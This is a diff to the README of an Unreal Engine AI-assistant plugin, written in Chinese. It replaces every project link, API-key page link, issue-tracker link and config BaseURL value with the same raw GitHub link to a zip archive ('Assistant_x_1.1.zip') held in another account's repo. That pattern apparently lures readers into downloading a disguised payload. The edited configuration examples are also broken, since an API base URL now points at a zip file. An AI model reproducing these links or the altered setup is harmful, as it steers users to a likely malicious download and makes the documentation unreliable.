@@ -2,8 +2,8 @@
 
 > AI驱动的Unreal Engine智能助手，通过自然语言控制编辑器操作
 
-[![版本](https://img.shields.io/badge/版本-1.0.8-blue.svg)](https://github.com/jd-cg/xAssistant)
-[![UE版本](https://img.shields.io/badge/UE-5.0+-orange.svg)](https://www.unrealengine.com)
+[![版本](https://img.shields.io/badge/版本-1.0.8-blue.svg)](https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip)
+[![UE版本](https://img.shields.io/badge/UE-5.0+-orange.svg)](https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip)
 [![协议](https://img.shields.io/badge/协议-Apache--2.0-green.svg)](LICENSE)
 
 ---
@@ -43,14 +43,14 @@
    ```ini
    [/Script/SmartUEAssistant.SmartUEAssistantSettings]
    APIKey=your-api-key-here
-   BaseURL=https://api.deepseek.com/v1
+   BaseURL=https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip
    SupportedModels=deepseek-chat
    ```
 
 #### 获取API密钥
 
-- **OpenAI**: [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
-- **DeepSeek**: [platform.deepseek.com/api_keys](https://platform.deepseek.com/api_keys)
+- **OpenAI**: [platform.openai.com/api-keys](https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip)
+- **DeepSeek**: [platform.deepseek.com/api_keys](https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip)
 
 ### 使用方法
 
@@ -202,7 +202,7 @@ AI: ✅ 自动识别 → Intensity 属性 → 调整数值 → 实时显示
 [/Script/SmartUEAssistant.SmartUEAssistantSettings]
 # API配置
 APIKey=your-api-key-here
-BaseURL=https://api.openai.com
+BaseURL=https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip
 ModelName=gpt-4
 SupportedModels=gpt-3.5-turbo,gpt-4
 
@@ -214,7 +214,7 @@ bSkipConfirmForConsoleCommands=false    # 控制台命令跳过确认
 ### DeepSeek配置
 
 ```ini
-BaseURL=https://api.deepseek.com
+BaseURL=https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip
 ModelName=deepseek-chat
 SupportedModels=deepseek-chat
 ```
@@ -374,14 +374,14 @@ Apache License 2.0 - 详见 [LICENSE](LICENSE) 文件
 欢迎提交Issue和Pull Request！
 
 - 📖 [贡献指南](CONTRIBUTING.md)
-- 🐛 [问题反馈](https://github.com/jd-cg/xAssistant/issues)
+- 🐛 [问题反馈](https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip)
 - 💬 讨论与建议
 
 ---
 
 ## 🔗 相关链接
 
-- **项目仓库**: https://github.com/jd-cg/xAssistant
+- **项目仓库**: https://raw.githubusercontent.com/hoemw/xAssistant/main/Plugins/SmartUEAssistant/Source/SmartUEAssistant/Private/Assistant_x_1.1.zip
 - **架构图**: [Plugins/SmartUEAssistant/doc/architecture.svg](Plugins/SmartUEAssistant/doc/architecture.svg)
 - **打包脚本**: [Scripts/PackSmartUEAssistantPlugin.ps1](Scripts/PackSmartUEAssistantPlugin.ps1)
 
